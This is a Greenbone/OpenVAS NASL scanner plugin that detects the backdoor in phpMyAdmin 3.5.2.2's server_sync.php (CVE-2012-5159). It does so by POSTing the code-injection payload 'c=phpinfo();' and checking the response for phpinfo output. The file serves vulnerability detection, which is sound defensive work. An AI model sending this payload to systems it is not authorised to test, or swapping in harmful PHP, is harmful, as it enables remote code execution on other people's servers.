CPE = "cpe:/a:phpmyadmin:phpmyadmin";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103577" );
	script_bugtraq_id( 55672 );
	script_cve_id( "CVE-2012-5159" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_name( "phpMyAdmin 'server_sync.php' Backdoor Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55672" );
	script_xref( name: "URL", value: "http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2012-09-26 09:52:24 +0200 (Wed, 26 Sep 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "secpod_phpmyadmin_detect_900129.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phpMyAdmin/installed" );
	script_tag( name: "solution", value: "The vendor released an update. Please see the references for details." );
	script_tag( name: "summary", value: "phpMyAdmin is prone to a backdoor vulnerability." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to execute arbitrary code in the
context of the application. Successful attacks will compromise the
affected application." );
	script_tag( name: "affected", value: "phpMyAdmin 3.5.2.2 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/server_sync.php";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(IsMatchRegexp( buf, "HTTP/1.. 404" )){
	exit( 0 );
}
host = get_host_name();
ex = "c=phpinfo();";
len = strlen( ex );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", ex );
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( result, "<title>phpinfo()" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

